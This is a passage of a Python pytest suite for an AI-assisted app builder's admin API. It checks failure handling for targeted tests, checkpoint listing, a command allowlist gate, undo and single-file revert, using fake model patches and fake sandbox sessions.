    async def _failing_targeted_tests(_files: dict[str, str], _changed_paths: list[str]) -> dict[str, object]:
        return {
            "ok": False,
            "status": "failed",
            "message": "vitest failure: 1 test failed",
            "diagnostics": [{"message": "vitest failure: 1 test failed"}],
        }

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._builder_tool_run_targeted_tests", _failing_targeted_tests)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Agentic Targeted Tests Failure App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Refactor home layout",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("vitest failure" in item["message"] for item in detail["diagnostics"])

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.failed
    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
    assert any(
        item.get("event") == "tool_failed"
        and item.get("data", {}).get("tool") == "run_targeted_tests"
        for item in (persisted.tool_trace or [])
    )


@pytest.mark.asyncio
async def test_builder_checkpoints_endpoint_returns_auto_run_checkpoint(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Checkpoint List App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={"input": "Make the header title bold", "base_revision_id": draft_revision_id},
    )
    assert stream_resp.status_code == 200

    checkpoints_resp = await client.get(
        f"/admin/apps/{app_id}/builder/checkpoints?limit=10",
        headers=headers,
    )
    assert checkpoints_resp.status_code == 200
    payload = checkpoints_resp.json()
    assert isinstance(payload, list)
    assert payload
    assert payload[0]["checkpoint_type"] == "auto_run"
    assert payload[0]["revision_id"]


@pytest.mark.asyncio
async def test_builder_chat_stream_command_allowlist_denies_non_allowed(client, db_session, monkeypatch):
    monkeypatch.setenv("BUILDER_MODEL_PATCH_GENERATION_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_CHAT_SANDBOX_TOOLS_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_CHAT_COMMANDS_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_CHAT_COMMAND_ALLOWLIST", "npm run lint")

    async def _fake_model_patch(**_: object) -> BuilderPatchGenerationResult:
        return BuilderPatchGenerationResult(
            operations=[
                BuilderPatchOp(
                    op="upsert_file",
                    path="src/App.tsx",
                    content="export function App() { return <div>Command Gate</div>; }",
                )
            ],
            summary="updated app copy",
            rationale="exercise command allowlist gate",
            assumptions=[],
        )

    class _FakeSession:
        sandbox_id = "sandbox-1"
        status = "running"
        last_error = None

    async def _fake_ensure_session(*args, **kwargs):
        return _FakeSession()

    async def _fake_sync_session(*args, **kwargs):
        return _FakeSession()

    initial_files: dict[str, str] = {}

    async def _fake_snapshot(*args, **kwargs):
        return dict(initial_files)

    async def _fake_apply(*args, **kwargs):
        return None

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._snapshot_files_from_sandbox", _fake_snapshot)
    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._apply_patch_operations_to_sandbox", _fake_apply)
    monkeypatch.setattr(
        "app.api.routers.published_apps_admin.PublishedAppDraftDevRuntimeService.ensure_session",
        _fake_ensure_session,
    )
    monkeypatch.setattr(
        "app.api.routers.published_apps_admin.PublishedAppDraftDevRuntimeService.sync_session",
        _fake_sync_session,
    )

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Command Allowlist App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]
    initial_files.update(state_resp.json()["current_draft_revision"]["files"])

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={"input": "Update the hero title", "base_revision_id": draft_revision_id},
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("allowlisted" in item["message"] or "allowlist" in item["message"] for item in detail["diagnostics"])


@pytest.mark.asyncio
async def test_builder_undo_restores_previous_revision_and_creates_new_revision(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Undo Run App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_before = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_before.status_code == 200
    base_revision_id = state_before.json()["current_draft_revision"]["id"]
    base_app_source = state_before.json()["current_draft_revision"]["files"]["src/App.tsx"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={"input": "Make the header title bold", "base_revision_id": base_revision_id},
    )
    assert stream_resp.status_code == 200

    state_after_run = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after_run.status_code == 200
    run_revision_id = state_after_run.json()["current_draft_revision"]["id"]
    assert run_revision_id != base_revision_id

    undo_resp = await client.post(
        f"/admin/apps/{app_id}/builder/undo",
        headers=headers,
        json={"base_revision_id": run_revision_id},
    )
    assert undo_resp.status_code == 200
    undo_payload = undo_resp.json()
    assert undo_payload["revision"]["id"] != run_revision_id
    assert undo_payload["restored_from_revision_id"] == base_revision_id

    state_after_undo = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after_undo.status_code == 200
    assert state_after_undo.json()["current_draft_revision"]["id"] == undo_payload["revision"]["id"]
    assert state_after_undo.json()["current_draft_revision"]["files"]["src/App.tsx"] == base_app_source


@pytest.mark.asyncio
async def test_builder_file_revert_restores_single_file(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Revert File App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_before = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_before.status_code == 200
    base_revision_id = state_before.json()["current_draft_revision"]["id"]
    base_app_source = state_before.json()["current_draft_revision"]["files"]["src/App.tsx"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={"input": "Make the header title bold", "base_revision_id": base_revision_id},
    )
    assert stream_resp.status_code == 200

    state_after_run = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after_run.status_code == 200
    run_revision_id = state_after_run.json()["current_draft_revision"]["id"]
    run_app_source = state_after_run.json()["current_draft_revision"]["files"]["src/App.tsx"]
    assert run_app_source != base_app_source

    revert_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revert-file",
        headers=headers,
        json={
            "path": "src/App.tsx",
            "from_revision_id": base_revision_id,
            "base_revision_id": run_revision_id,
        },
    )
    assert revert_resp.status_code == 200
    revert_payload = revert_resp.json()
    assert revert_payload["reverted_path"] == "src/App.tsx"

    state_after_revert = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after_revert.status_code == 200
    assert state_after_revert.json()["current_draft_revision"]["id"] == revert_payload["revision"]["id"]
    assert state_after_revert.json()["current_draft_revision"]["files"]["src/App.tsx"] == base_app_source
